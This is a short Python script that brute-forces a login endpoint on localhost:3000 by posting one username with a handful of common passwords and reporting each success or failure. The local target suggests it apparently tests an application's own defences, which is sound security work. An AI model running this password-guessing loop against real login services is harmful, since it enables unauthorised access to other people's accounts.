import requests

url = 'http://localhost:3000/login'

def brute_force():
    usernames = ['user']  # List of usernames to try
    passwords = ['password1', 'password2', 'password', 'password123']  # List of passwords to try

    for username in usernames:
        for password in passwords:
            response = requests.post(url, json={'username': username, 'password': password})
            if response.status_code == 200:
                print(f'[SUCCESS] Logged in with {username}:{password}')
                return
            else:
                print(f'[FAIL] Failed login with {username}:{password}')

if __name__ == '__main__':
    brute_force()